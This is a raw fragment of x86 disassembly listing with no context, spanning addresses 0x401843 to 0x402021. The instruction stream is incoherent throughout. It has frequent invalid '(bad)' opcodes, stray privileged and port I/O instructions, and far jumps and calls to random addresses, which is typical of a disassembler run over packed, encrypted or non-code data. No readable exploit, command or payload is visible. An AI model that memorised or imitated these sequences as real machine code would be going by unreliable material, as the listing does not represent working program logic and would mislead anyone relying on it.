  401843:	icebp  
  401844:	add    DWORD PTR [edi],edi
  401846:	(bad)  
  401847:	cdq    
  401848:	sub    edx,DWORD PTR [ebp+0x2f]
  40184b:	sub    dl,cl
  40184d:	dec    ecx
  40184e:	scas   eax,DWORD PTR es:[edi]
  40184f:	lahf   
  401850:	push   es
  401851:	into   
  401852:	test   BYTE PTR [ebx-0x3d],ah
  401855:	mov    al,0x7
  401857:	mov    dl,0x78
  401859:	mov    esi,0xa4e0cf36
  40185e:	leave  
  40185f:	aaa    
  401860:	hlt    
  401861:	sbb    al,0xd1
  401863:	add    dl,BYTE PTR [esi-0x52]
  401866:	xlat   BYTE PTR ds:[ebx]
  401867:	leave  
  401868:	fld    TBYTE PTR [eax+0x38]
  40186b:	(bad)  [eax]
  40186d:	leave  
  40186e:	fbstp  TBYTE PTR [edx]
  401870:	pop    edi
  401871:	popa   
  401872:	cld    
  401873:	mov    bl,0xaa
  401875:	pop    ebx
  401876:	dec    ecx
  401877:	xchg   DWORD PTR [esi],ecx
  401879:	hlt    
  40187a:	into   
  40187b:	std    
  40187c:	adc    al,0xe1
  40187e:	cdq    
  40187f:	sbb    BYTE PTR [edx-0x3a532ee3],al
  401885:	std    
  401886:	xchg   edi,eax
  401887:	loope  0x4018f9
  401889:	call   0x3aa04356
  40188e:	adc    edi,0xb
  401891:	or     BYTE PTR [ecx-0x28],cl
  401894:	jo     0x4018f6
  401896:	cmp    al,0x2c
  401898:	xchg   edi,eax
  401899:	enter  0xa983,0x24
  40189d:	mov    ebp,0x74ef648e
  4018a2:	mov    dl,0x29
  4018a4:	dec    edx
  4018a5:	lods   al,BYTE PTR ds:[esi]
  4018a6:	outs   dx,BYTE PTR ds:[esi]
  4018a7:	and    ebx,DWORD PTR [eax]
  4018a9:	icebp  
  4018aa:	fcomp  DWORD PTR [ebp-0x30]
  4018ad:	int    0x56
  4018af:	aaa    
  4018b0:	jmp    0x40184c
  4018b2:	inc    esi
  4018b3:	or     al,0xee
  4018b5:	jge    0x4018cc
  4018b7:	or     BYTE PTR [edx-0x68],ah
  4018ba:	dec    eax
  4018bb:	push   ecx
  4018bc:	aaa    
  4018bd:	test   al,0xcf
  4018bf:	enter  0xbaa5,0xaf
  4018c3:	or     ebx,edx
  4018c5:	cwde   
  4018c6:	pop    ebp
  4018c7:	addr16 jne 0x4018ea
  4018ca:	sbb    BYTE PTR [eax-0x79],bl
  4018cd:	mov    dl,BYTE PTR [eax+0x54406614]
  4018d3:	popf   
  4018d4:	ror    edx,cl
  4018d6:	adc    BYTE PTR [eax+0x6f19fafd],ch
  4018dc:	mov    bh,0xee
  4018de:	lahf   
  4018df:	jmp    0xccde:0xb57e4762
  4018e6:	dec    ebx
  4018e7:	scas   eax,DWORD PTR es:[edi]
  4018e8:	adc    DWORD PTR ds:0x4cd48bce,edx
  4018ee:	mov    dl,0x2d
  4018f0:	cdq    
  4018f1:	cmp    DWORD PTR [ebp+eax*2+0x4b],ecx
  4018f5:	jge    0x401898
  4018f7:	adc    eax,DWORD PTR [edi+ecx*8+0x7c025ad9]
  4018fe:	cld    
  4018ff:	in     eax,dx
  401900:	push   esp
  401901:	jne    0x401971
  401903:	push   esp
  401904:	add    eax,0xaa6408ac
  401909:	push   es
  40190a:	push   esi
  40190b:	mul    DWORD PTR [esi]
  40190d:	and    DWORD PTR [edx-0x4d97c0e2],esp
  401913:	mov    bl,BYTE PTR [edi]
  401915:	mov    eax,0x84fab51e
  40191a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40191b:	or     al,0x28
  40191d:	xchg   edx,eax
  40191e:	pop    eax
  40191f:	push   edx
  401920:	pop    edx
  401921:	inc    ebx
  401922:	cmp    esp,DWORD PTR [ebp-0x5]
  401925:	push   edx
  401926:	push   es
  401927:	jp     0x4018b3
  401929:	push   ebx
  40192a:	aam    0x28
  40192c:	bound  ebp,QWORD PTR [esi+0x23]
  40192f:	push   eax
  401930:	add    edi,DWORD PTR [edi]
  401932:	loope  0x401927
  401934:	je     0x401996
  401936:	test   eax,0x4d31fae2
  40193b:	retf   
  40193c:	or     dh,ah
  40193e:	popfw  
  401940:	and    eax,0xaf135f30
  401945:	or     BYTE PTR [esi-0x34504a64],ah
  40194b:	stc    
  40194c:	(bad)  
  40194e:	bound  edx,QWORD PTR [ecx-0x51]
  401951:	fwait
  401952:	mov    DWORD PTR [edi-0x60b32f95],edi
  401958:	mov    bh,0x46
  40195a:	(bad)  
  40195b:	cmp    eax,0x6906743a
  401960:	out    dx,eax
  401961:	pop    edi
  401962:	stos   BYTE PTR es:[edi],al
  401963:	pop    ebx
  401964:	xor    DWORD PTR [edx+0xaf6ef33],0xfffffff0
  40196b:	popa   
  40196c:	add    eax,0x3121b834
  401971:	pop    eax
  401972:	pop    es
  401973:	jg     0x4019e2
  401975:	xchg   esi,eax
  401976:	test   eax,0x9ccd5162
  40197b:	mov    bl,0x8
  40197d:	outs   dx,BYTE PTR ds:[esi]
  40197e:	repz add eax,0x3d0c791e
  401984:	mov    ah,ch
  401986:	xchg   esi,eax
  401987:	mov    ch,0x23
  401989:	mov    dh,0xda
  40198b:	in     al,dx
  40198c:	fwait
  40198d:	mov    dh,0xa5
  40198f:	pop    ebp
  401990:	inc    BYTE PTR [ebx-0x4e]
  401993:	mov    esp,0x82c90396
  401998:	fdivrp st(0),st
  40199a:	sti    
  40199b:	idiv   DWORD PTR [edx+0x60c2a5cf]
  4019a1:	cdq    
  4019a2:	jb     0x4019a6
  4019a4:	xor    DWORD PTR ds:0x3464a644,ebx
  4019aa:	imul   ecx,DWORD PTR [edi],0xffffffed
  4019ad:	jecxz  0x40196d
  4019af:	fidiv  DWORD PTR [eax+0x66818104]
  4019b5:	adc    BYTE PTR [esi],bl
  4019b7:	call   0x5b36af85
  4019bc:	xchg   esp,eax
  4019bd:	lahf   
  4019be:	les    edi,FWORD PTR [ebp+0x21]
  4019c1:	jg     0x40196c
  4019c3:	ja     0x401997
  4019c5:	sub    eax,0x338b993
  4019ca:	scas   al,BYTE PTR es:[edi]
  4019cb:	icebp  
  4019cc:	dec    esi
  4019cd:	out    0x83,al
  4019cf:	cmp    al,0x75
  4019d1:	or     BYTE PTR [ecx-0x670d77b2],dh
  4019d7:	(bad)  
  4019d8:	je     0x401990
  4019da:	xchg   ebp,eax
  4019db:	aad    0xc
  4019dd:	ror    BYTE PTR [ecx+ecx*1],1
  4019e0:	mov    al,ds:0x48b18cdb
  4019e5:	xor    DWORD PTR ds:0x9179d3a5,ebp
  4019eb:	mov    ebp,0x6fe6a560
  4019f0:	mov    dh,0x11
  4019f2:	dec    edx
  4019f3:	inc    esp
  4019f4:	xchg   ebp,eax
  4019f5:	sbb    DWORD PTR [edx],0x10f8c009
  4019fb:	xchg   esi,eax
  4019fc:	icebp  
  4019fd:	push   0x24f13dbe
  401a02:	outs   dx,BYTE PTR ds:[esi]
  401a03:	mov    BYTE PTR [esi],cl
  401a05:	and    ch,BYTE PTR [ebx]
  401a07:	mov    edx,0x693756ad
  401a0d:	cld    
  401a0e:	jle    0x401a15
  401a10:	sbb    eax,0x713f8d42
  401a15:	jp     0x401a83
  401a17:	iret   
  401a18:	addr16 test eax,esi
  401a1b:	test   eax,0x841abcf6
  401a20:	adc    al,0xec
  401a22:	(bad)  
  401a23:	in     eax,0x69
  401a25:	push   ss
  401a26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a27:	mov    edi,0x655d3cfa
  401a2c:	xor    eax,0x41a486b5
  401a31:	sbb    eax,0xff25aece
  401a36:	jb     0x4019dd
  401a38:	fmul   DWORD PTR [ebx-0xb14683c]
  401a3e:	hlt    
  401a3f:	rcl    BYTE PTR [ecx+0x14d3d917],0xca
  401a46:	sub    al,0x4d
  401a48:	and    dh,BYTE PTR [edx+0x535d1635]
  401a4e:	fsub   QWORD PTR [edi+0x443ce2ee]
  401a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a55:	pusha  
  401a56:	mov    DWORD PTR [ebx+eiz*4+0x1e9e36cc],esp
  401a5d:	in     al,dx
  401a5e:	jmp    DWORD PTR [esi]
  401a60:	ror    edx,cl
  401a62:	xchg   edx,eax
  401a63:	out    0x8f,eax
  401a65:	xchg   DWORD PTR [eax+0x5001b1ab],edx
  401a6b:	sbb    edi,ecx
  401a6d:	mov    ds:0xe3b1ad28,eax
  401a72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a73:	and    eax,0xd2243f1a
  401a78:	dec    esp
  401a79:	inc    ebx
  401a7a:	inc    esi
  401a7b:	or     BYTE PTR [edx+0x6d],ah
  401a7e:	add    DWORD PTR [ebx+0x3a],edi
  401a81:	gs push esp
  401a83:	or     DWORD PTR [ecx+edx*4-0x3334b914],eax
  401a8a:	jne    0x401afc
  401a8c:	dec    edi
  401a8d:	pusha  
  401a8e:	call   0x180ca6ef
  401a93:	mov    BYTE PTR [ebx],ah
  401a95:	sbb    al,0x8c
  401a97:	jae    0x401abf
  401a99:	jg     0x401a34
  401a9b:	or     ch,BYTE PTR [edi-0x49538a16]
  401aa1:	fsubr  st,st(5)
  401aa3:	cmc    
  401aa4:	ins    BYTE PTR es:[edi],dx
  401aa5:	stos   BYTE PTR es:[edi],al
  401aa6:	mov    al,ds:0x869931d5
  401aab:	mov    al,ds:0x7a799e44
  401ab0:	les    eax,FWORD PTR ds:[esi]
  401ab3:	and    edi,eax
  401ab5:	ss out 0xe5,al
  401ab8:	jmp    0x401b29
  401aba:	mov    BYTE PTR [edx+edi*4+0x7f],ah
  401abe:	xor    DWORD PTR [ebp+0x40],edi
  401ac1:	ror    DWORD PTR [edi],cl
  401ac3:	cmp    ch,BYTE PTR [ebp-0x59c3fbf2]
  401ac9:	arpl   WORD PTR [esp+eax*8-0x8],bp
  401acd:	rcr    BYTE PTR [eax+0x9],1
  401ad0:	pop    ds
  401ad1:	popf   
  401ad2:	call   0xb1f9:0xdaefa51e
  401ad9:	(bad)  
  401ada:	lods   al,BYTE PTR ds:[esi]
  401adb:	cmp    eax,0xc25daac0
  401ae0:	mov    dl,BYTE PTR [edi-0x6e77a90a]
  401ae6:	call   0xb5e4976d
  401aeb:	push   ebx
  401aec:	jecxz  0x401a80
  401aee:	fbstp  TBYTE PTR [esi-0x5fefd3f8]
  401af4:	ss ss pop esp
  401af7:	in     al,dx
  401af8:	mov    ebp,0xe9afd59c
  401afd:	push   ds
  401afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401aff:	pusha  
  401b00:	mov    bh,0x46
  401b02:	add    BYTE PTR [eax],0xd2
  401b05:	or     DWORD PTR [ebp-0x2ea0d172],0x77
  401b0c:	pop    es
  401b0d:	mov    edx,0xe147f4ad
  401b12:	xor    esp,DWORD PTR [ecx-0x70e4d13]
  401b18:	nop
  401b19:	push   edi
  401b1a:	xor    al,0xb6
  401b1c:	loop   0x401aae
  401b1e:	jo     0x401b5d
  401b20:	outs   dx,BYTE PTR ss:[esi]
  401b22:	cli    
  401b23:	sbb    al,0x1
  401b25:	dec    edi
  401b26:	xchg   ebx,eax
  401b27:	repnz lea esp,[ebx]
  401b2a:	test   eax,0x70a1a9c2
  401b2f:	mov    bh,0xf6
  401b31:	addr16 in eax,dx
  401b33:	pushf  
  401b34:	aas    
  401b35:	mov    eax,0x3879b3a
  401b3a:	or     al,0xf8
  401b3c:	daa    
  401b3d:	inc    edi
  401b3e:	sbb    BYTE PTR [edi-0x63f3ff50],0xa4
  401b45:	sti    
  401b46:	pushf  
  401b47:	pop    ebx
  401b48:	mov    BYTE PTR [ecx-0x5870096e],0x74
  401b4f:	xor    edx,ebx
  401b51:	call   0xc2d7:0xfe76c489
  401b58:	sub    DWORD PTR fs:[eax+0x12],0x76
  401b5d:	aaa    
  401b5e:	mov    edi,0xe9629829
  401b63:	sub    BYTE PTR [ebx+0x528ff960],ah
  401b69:	mov    ebp,0xc9e7877b
  401b6e:	stos   BYTE PTR es:[edi],al
  401b6f:	adc    cl,BYTE PTR [ebx+edx*1+0x441dd6c5]
  401b76:	inc    edx
  401b77:	dec    DWORD PTR [ebp-0x63]
  401b7a:	mov    ebp,0x3d60fd3
  401b7f:	(bad)  
  401b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b82:	mov    bl,0x46
  401b84:	not    DWORD PTR [edx+0x44fd73de]
  401b8a:	shl    esi,cl
  401b8c:	nop
  401b8d:	xchg   edx,eax
  401b8e:	add    al,0xda
  401b90:	mov    ebp,0x6c7a99b1
  401b95:	sti    
  401b96:	scas   eax,DWORD PTR es:[edi]
  401b97:	out    0xc8,al
  401b99:	clc    
  401b9a:	jg     0x401b69
  401b9c:	dec    ebp
  401b9d:	xchg   edi,eax
  401b9e:	mov    eax,0xe8b0ed59
  401ba3:	push   eax
  401ba4:	leave  
  401ba5:	in     eax,0x95
  401ba7:	push   ebp
  401ba8:	ins    DWORD PTR es:[edi],dx
  401ba9:	mul    DWORD PTR [esi+0x21]
  401bac:	fild   QWORD PTR [ecx+0x1a6d836e]
  401bb2:	pop    edi
  401bb3:	sub    ah,BYTE PTR ds:0x9bb04497
  401bb9:	add    eax,0x583652b0
  401bbe:	push   ecx
  401bbf:	dec    esp
  401bc0:	leave  
  401bc1:	jnp    0x401bba
  401bc3:	sub    DWORD PTR [esi-0x39],ecx
  401bc6:	jmp    0x401b8e
  401bc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bc9:	mov    ds,ebp
  401bcb:	pop    ebx
  401bcc:	mov    cs,WORD PTR [edx]
  401bce:	sub    DWORD PTR [ebp-0x7c6dd5cf],esi
  401bd4:	jle    0x401bb5
  401bd6:	cmp    esi,ecx
  401bd8:	push   ebx
  401bd9:	cld    
  401bda:	xchg   ebp,eax
  401bdb:	cwde   
  401bdc:	inc    BYTE PTR [ecx+0x61]
  401bdf:	jns    0x401b7e
  401be1:	call   0xe386007c
  401be6:	rol    BYTE PTR [ebp-0x36fe9a6],0x16
  401bed:	add    al,0x55
  401bef:	cli    
  401bf0:	call   0xd2384c73
  401bf5:	fisttp DWORD PTR [ebp-0x255c08ec]
  401bfb:	cld    
  401bfc:	xchg   esi,eax
  401bfd:	and    dh,BYTE PTR [edx+0x66a876d4]
  401c03:	push   cs
  401c04:	push   edx
  401c05:	jo     0x401bad
  401c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c08:	(bad)  
  401c0a:	add    DWORD PTR [eax],0xc6d53bd1
  401c10:	sub    al,0x3c
  401c12:	cmp    eax,0x6a07fdb8
  401c17:	test   BYTE PTR [edx-0x41cbbfd0],0x1e
  401c1e:	cmp    cl,dl
  401c20:	pop    eax
  401c21:	dec    esi
  401c22:	push   0xe118e2a6
  401c27:	mov    dh,BYTE PTR [ebx-0x33ae7c13]
  401c2d:	sub    BYTE PTR [ecx-0x44edf606],0xee
  401c34:	popa   
  401c35:	or     al,BYTE PTR [edi+eax*1+0xb]
  401c39:	mov    eax,ds:0xe906f30
  401c3e:	cmp    ecx,esp
  401c40:	lock sub al,0x13
  401c43:	or     DWORD PTR [ecx-0x407320d5],ebx
  401c49:	dec    edx
  401c4a:	push   esi
  401c4b:	push   eax
  401c4c:	aas    
  401c4d:	mov    ah,0x18
  401c4f:	(bad)  
  401c51:	add    al,0x26
  401c53:	add    cl,dl
  401c55:	cwde   
  401c56:	ss es retf 
  401c59:	icebp  
  401c5a:	mov    dh,BYTE PTR [ebx]
  401c5c:	cwde   
  401c5d:	rcl    eax,1
  401c5f:	add    dh,BYTE PTR [edi+0x15]
  401c62:	call   0xca3f:0xff481c27
  401c69:	popf   
  401c6a:	mov    eax,ebp
  401c6c:	jno    0x401cd2
  401c6e:	adc    eax,ecx
  401c70:	mov    al,ds:0x416a334
  401c75:	adc    WORD PTR [esi-0x6e32ceb6],0xff87
  401c7d:	push   cs
  401c7e:	shl    BYTE PTR [eax+0x1daec75],1
  401c84:	jmp    0x8c8730a0
  401c89:	mov    al,0x4d
  401c8b:	jmp    0xc040b8dc
  401c90:	xchg   ecx,eax
  401c91:	repnz sar DWORD PTR [esi],0x84
  401c95:	add    esi,esi
  401c97:	sub    dl,dl
  401c99:	mov    bl,0xf2
  401c9b:	xor    BYTE PTR [eax+eax*1+0x6ea94be1],dh
  401ca2:	loopne 0x401cf2
  401ca4:	clc    
  401ca5:	mov    esi,0xf803ae03
  401caa:	fadd   QWORD PTR [edi]
  401cac:	stc    
  401cad:	fld    TBYTE PTR [edi-0x4a]
  401cb0:	xor    dh,BYTE PTR [edi]
  401cb2:	aam    0x23
  401cb4:	sub    DWORD PTR [esi],edx
  401cb6:	push   es
  401cb7:	int3   
  401cb8:	or     DWORD PTR [edx],eax
  401cba:	mov    bl,0x71
  401cbc:	popa   
  401cbd:	cwde   
  401cbe:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  401cc0:	daa    
  401cc1:	mov    ds:0xb17c7e04,eax
  401cc6:	mov    al,ds:0x6ccd29b8
  401ccb:	xchg   edx,eax
  401ccc:	jmp    0xa2ab:0x18c7fdd
  401cd3:	pop    edx
  401cd4:	retf   0xa4b5
  401cd7:	adc    cl,bh
  401cd9:	and    DWORD PTR [ecx+0x6606688a],eax
  401cdf:	pop    eax
  401ce0:	jecxz  0x401cdf
  401ce2:	test   BYTE PTR ds:0x6bddd55b,al
  401ce8:	sbb    dl,ch
  401cea:	fdivr  QWORD PTR [ebp+eiz*2+0xf]
  401cee:	sti    
  401cef:	(bad)  [eax-0x61]
  401cf2:	ds mov bh,0x2d
  401cf5:	retf   
  401cf6:	push   edx
  401cf7:	daa    
  401cf8:	jmp    0xcecfcc43
  401cfd:	shl    DWORD PTR [edi+0x6ab03cd1],0xa7
  401d04:	fs jecxz 0x401c90
  401d07:	mov    ah,0x5f
  401d09:	stos   DWORD PTR es:[edi],eax
  401d0a:	ret    
  401d0b:	push   edx
  401d0c:	mov    bh,0x9
  401d0e:	mov    ch,BYTE PTR [edx-0x80]
  401d11:	repz xor edx,DWORD PTR [edx-0x16]
  401d15:	jl     0x401ce6
  401d17:	daa    
  401d18:	fwait
  401d19:	xchg   ecx,eax
  401d1a:	xor    al,0xa6
  401d1c:	shr    DWORD PTR [edx],cl
  401d1e:	and    DWORD PTR [edx],0x50
  401d21:	sub    al,0xc9
  401d23:	fimul  WORD PTR [ebx]
  401d25:	popf   
  401d26:	and    al,0xa5
  401d28:	test   eax,0xa827dba7
  401d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d2e:	adc    DWORD PTR [edx+esi*2],eax
  401d31:	mov    esi,DWORD PTR [ecx-0xe]
  401d34:	mov    bl,0xd4
  401d36:	add    BYTE PTR [ecx+eiz*2-0x6c602a0d],cl
  401d3d:	push   ecx
  401d3e:	mov    DWORD PTR [esi+ebx*4],0x2eb543c3
  401d45:	cmp    DWORD PTR [ebx-0x3527364a],ecx
  401d4b:	call   0x1a9b9146
  401d50:	push   0x5a
  401d52:	sar    DWORD PTR [edi],0xf
  401d55:	js     0x401d97
  401d57:	dec    ecx
  401d58:	cmp    al,0xd8
  401d5a:	pusha  
  401d5b:	fcom   QWORD PTR ds:0xc39ba605
  401d61:	jbe    0x401d2a
  401d63:	and    DWORD PTR [esi],0x8da901ef
  401d69:	or     al,0x1f
  401d6b:	(bad)  
  401d6c:	retf   0x920d
  401d6f:	dec    ebp
  401d70:	imul   ebp,ebx,0x22b925fa
  401d76:	jmp    0xece8:0xd8ae49f
  401d7d:	aad    0x7c
  401d7f:	(bad)  
  401d81:	cdq    
  401d82:	out    dx,eax
  401d83:	jae    0x401d59
  401d85:	(bad)  
  401d86:	cmp    eax,0xea090b84
  401d8b:	adc    al,0xfa
  401d8d:	lock sar DWORD PTR [eax],cl
  401d90:	sub    ch,dh
  401d92:	inc    ecx
  401d93:	push   ebx
  401d94:	leave  
  401d95:	push   eax
  401d96:	lahf   
  401d97:	rol    DWORD PTR [esi],cl
  401d99:	out    dx,eax
  401d9a:	cmp    ah,BYTE PTR [edi+0x7]
  401d9d:	mov    ah,0x49
  401d9f:	cmp    bh,bh
  401da1:	dec    ebp
  401da2:	fwait
  401da3:	dec    ebp
  401da4:	(bad)  
  401da5:	mov    bh,0x74
  401da7:	retf   
  401da8:	inc    al
  401daa:	jbe    0x401d69
  401dac:	into   
  401dad:	shl    DWORD PTR [ebx+ebx*8-0x1a],1
  401db1:	pop    ds
  401db2:	sahf   
  401db3:	cdq    
  401db4:	mov    bl,0x46
  401db6:	loop   0x401d48
  401db8:	sub    esp,esp
  401dba:	jbe    0x401d9b
  401dbc:	or     BYTE PTR [esi+0x49753272],bh
  401dc2:	leave  
  401dc3:	stc    
  401dc4:	and    edi,DWORD PTR [edx+0x2fe70f39]
  401dca:	leave  
  401dcb:	mov    dl,0x5c
  401dcd:	inc    ebx
  401dce:	mov    ebp,0x681837e4
  401dd3:	daa    
  401dd4:	lods   eax,DWORD PTR ds:[esi]
  401dd5:	aad    0x33
  401dd7:	rcl    BYTE PTR [edx+esi*4],0x73
  401ddb:	pop    ss
  401ddc:	(bad)  
  401ddd:	push   ebp
  401dde:	push   ss
  401ddf:	dec    edi
  401de0:	in     eax,0x85
  401de2:	sbb    al,0x2
  401de4:	stos   DWORD PTR es:[edi],eax
  401de5:	push   esp
  401de6:	icebp  
  401de7:	outs   dx,BYTE PTR ds:[esi]
  401de8:	mov    ecx,0x2d3c01da
  401ded:	daa    
  401dee:	addr16 cwde 
  401df0:	fucomp st(2)
  401df2:	jmp    0x6b57:0xe40d0d8f
  401df9:	fs jmp 0x66790d6a
  401dff:	adc    al,0x1e
  401e01:	test   al,0x41
  401e03:	stos   DWORD PTR es:[edi],eax
  401e04:	aam    0x4b
  401e06:	(bad)  
  401e07:	jmp    0x6618:0x81c2f3ec
  401e0e:	call   0x192e29e3
  401e13:	mov    cl,0xa7
  401e15:	xor    BYTE PTR [eax-0x7a],al
  401e18:	jno    0x401e63
  401e1a:	dec    edx
  401e1b:	inc    esp
  401e1c:	mov    ecx,0xdb7ee4f0
  401e21:	fsubr  DWORD PTR [edi+0x6de05da8]
  401e27:	sub    eax,0xaa66f1f3
  401e2c:	sbb    DWORD PTR [eax],ebp
  401e2e:	adc    BYTE PTR [eax],bl
  401e30:	arpl   WORD PTR [esi],sp
  401e32:	cmp    eax,0xeaec051f
  401e37:	or     DWORD PTR [edi+0x3aba5c87],ebp
  401e3d:	mov    ebx,0xf98a7e37
  401e42:	jle    0x401dd9
  401e44:	adc    DWORD PTR [ecx+0x1037641e],eax
  401e4a:	inc    eax
  401e4c:	ja     0x401e07
  401e4e:	es inc eax
  401e50:	xlat   BYTE PTR ds:[ebx]
  401e51:	or     DWORD PTR [eax+0x7211029d],esi
  401e57:	addr16 push esi
  401e59:	out    0xac,al
  401e5b:	out    dx,eax
  401e5c:	(bad)  
  401e5e:	mov    bh,0x23
  401e60:	js     0x401e28
  401e62:	je     0x401e50
  401e64:	ds cli 
  401e66:	mov    al,BYTE PTR [edi-0x73]
  401e69:	inc    ecx
  401e6a:	ds fs mov ecx,0x537669a3
  401e71:	sbb    al,0xc3
  401e73:	cwde   
  401e74:	ins    BYTE PTR es:[edi],dx
  401e75:	or     dh,dh
  401e77:	sbb    BYTE PTR [edx],0x28
  401e7a:	mov    eax,ds:0x4e3c40e8
  401e7f:	repnz pusha 
  401e81:	das    
  401e82:	pop    edi
  401e83:	in     eax,0x5
  401e85:	loop   0x401e83
  401e87:	addr16 cmp eax,0x8e781333
  401e8d:	int3   
  401e8e:	sbb    esp,DWORD PTR [esi]
  401e90:	(bad)  
  401e91:	mov    al,BYTE PTR [ecx]
  401e93:	minps  xmm4,xmm7
  401e96:	addr16 jne 0x401e1e
  401e99:	or     edx,eax
  401e9b:	xchg   ebx,eax
  401e9c:	call   0xb8590e2c
  401ea1:	or     DWORD PTR [ecx-0x19],ecx
  401ea4:	das    
  401ea5:	jmp    0x401ee3
  401ea7:	or     cl,BYTE PTR [ebx]
  401ea9:	mov    ebp,0x1e9f6300
  401eae:	push   cs
  401eaf:	xlat   BYTE PTR ds:[ebx]
  401eb0:	dec    esi
  401eb1:	cld    
  401eb2:	xor    eax,0x6eb4e37f
  401eb7:	lods   eax,DWORD PTR ds:[esi]
  401eb8:	cmp    BYTE PTR [ebp+0x5],0x54
  401ebc:	test   eax,0xe0d56d81
  401ec1:	mov    DWORD PTR [ebp+0x66],edi
  401ec4:	mov    eax,0x9c8087c0
  401ec9:	bound  eax,QWORD PTR [ebx-0x46]
  401ecc:	repnz inc ebp
  401ece:	and    eax,0xd757a1bb
  401ed3:	inc    eax
  401ed4:	sub    al,0xe6
  401ed6:	inc    eax
  401ed7:	sbb    DWORD PTR [esi-0x45abeea2],esi
  401edd:	jmp    FWORD PTR [eax-0x6966349e]
  401ee3:	jnp    0x401e9e
  401ee5:	ret    
  401ee6:	popf   
  401ee7:	inc    ebx
  401ee8:	push   esi
  401ee9:	push   0x29960cec
  401eee:	mov    eax,0xae67ab2e
  401ef3:	sub    dh,BYTE PTR [edi-0x223ce3d8]
  401ef9:	jecxz  0x401ecb
  401efb:	jno    0x401f69
  401efd:	add    ah,al
  401eff:	and    dh,bh
  401f01:	stos   DWORD PTR es:[edi],eax
  401f02:	inc    ecx
  401f03:	jno    0x401e98
  401f05:	test   eax,0x4f171653
  401f0a:	(bad)  
  401f0b:	int    0x26
  401f0d:	jne    0x401ec8
  401f0f:	mov    eax,ds:0x82d783a8
  401f14:	popa   
  401f15:	inc    edx
  401f16:	(bad)  
  401f17:	fxch   st(0)
  401f19:	jne    0x401f98
  401f1b:	stos   DWORD PTR es:[edi],eax
  401f1c:	(bad)  [ebx+ebp*8-0x60]
  401f20:	or     al,0xfe
  401f22:	call   FWORD PTR [esi+0x46]
  401f25:	push   0xa77aeaf
  401f2a:	mov    ah,0xe7
  401f2c:	mov    ecx,0xa187e980
  401f31:	(bad)
  401f34:	inc    edx
  401f35:	jg     0x401eda
  401f37:	dec    esp
  401f38:	and    dh,BYTE PTR [eax]
  401f3a:	dec    edi
  401f3b:	push   ecx
  401f3c:	enter  0xe81d,0x82
  401f40:	dec    esp
  401f41:	fmul   QWORD PTR [eax+0x78]
  401f44:	sub    esi,DWORD PTR [ebx+ebp*1]
  401f47:	mov    ecx,0x835a7c
  401f4c:	out    dx,eax
  401f4d:	jl     0x401f60
  401f4f:	div    BYTE PTR [eax+ebx*2-0x20]
  401f53:	adc    al,0xd5
  401f55:	push   esi
  401f56:	add    dl,BYTE PTR [ecx+0x5cc44aaf]
  401f5c:	pop    ss
  401f5d:	lds    esp,FWORD PTR [ebx-0x11]
  401f60:	mov    bh,0xda
  401f62:	push   esi
  401f63:	xchg   edx,eax
  401f64:	mov    esi,0x8c2bff
  401f69:	jle    0x401f93
  401f6b:	jge    0x401fdc
  401f6d:	das    
  401f6e:	sbb    ecx,DWORD PTR [edx]
  401f70:	pop    ebp
  401f71:	icebp  
  401f72:	in     eax,dx
  401f73:	xor    BYTE PTR [edx],al
  401f75:	daa    
  401f76:	jnp    0x401f4e
  401f78:	adc    al,0xfb
  401f7a:	(bad)  
  401f7b:	xchg   ebx,eax
  401f7c:	int    0x57
  401f7e:	jae    0x401f16
  401f80:	mov    ah,0xf3
  401f82:	inc    eax
  401f83:	fisttp DWORD PTR [ebx-0x187506c4]
  401f89:	cdq    
  401f8a:	sbb    eax,0x91ee3c6a
  401f8f:	dec    ecx
  401f90:	jo     0x401fbd
  401f92:	imul   ebp,ebp,0xeb32b709
  401f98:	push   0x749fbdb2
  401f9d:	mov    al,0x3f
  401f9f:	leave  
  401fa0:	sar    DWORD PTR [eax+ebx*4],1
  401fa3:	std    
  401fa4:	cmp    DWORD PTR [esi],ecx
  401fa6:	pop    edx
  401fa7:	in     al,dx
  401fa8:	or     al,0xbf
  401faa:	fstp   st(4)
  401fac:	gs sbb eax,esp
  401faf:	sbb    dh,dh
  401fb1:	pop    ecx
  401fb2:	stos   BYTE PTR es:[edi],al
  401fb3:	sbb    bh,BYTE PTR [esi+0x33]
  401fb6:	pop    eax
  401fb7:	data16 das 
  401fb9:	jmp    0xd2620bc7
  401fbe:	sbb    DWORD PTR [bx-0x1],ebx
  401fc2:	imul   edx,DWORD PTR [eax],0xffffffce
  401fc5:	mov    WORD PTR ds:0x2d529759,?
  401fcb:	inc    edx
  401fcc:	sub    DWORD PTR [edi-0x3fba0859],ebp
  401fd2:	push   edi
  401fd3:	push   ecx
  401fd4:	dec    esp
  401fd5:	xchg   ecx,eax
  401fd6:	sbb    DWORD PTR [ecx],edi
  401fd8:	mov    DWORD PTR [edx+0x308ad525],eax
  401fde:	adc    DWORD PTR [ebp+edi*8-0x24],esi
  401fe2:	jnp    0x402062
  401fe4:	mov    esp,0xc9960ce7
  401fe9:	dec    edi
  401fea:	test   al,0x8c
  401fec:	jmp    0x40201d
  401fee:	mov    ch,0xd6
  401ff0:	and    al,0xe8
  401ff2:	add    cl,0x57
  401ff5:	mov    ds:0x82f63f61,eax
  401ffa:	push   cs
  401ffb:	mov    edi,0xd5a95d59
  402000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402001:	or     BYTE PTR [eax],al
  402003:	sbb    ebx,esp
  402005:	retf   
  402006:	jge    0x401fcb
  402008:	inc    edi
  402009:	xchg   ebp,eax
  40200a:	(bad)  
  40200c:	das    
  40200d:	leave  
  40200e:	js     0x401fa6
  402010:	dec    eax
  402011:	jo     0x40201f
  402013:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402014:	adc    ch,cl
  402016:	sub    al,0xcc
  402018:	and    DWORD PTR [edx+0x32aab6a8],ecx
  40201e:	clc    
  40201f:	fmul   QWORD PTR [ecx]
  402021:	sub    al,0x1a
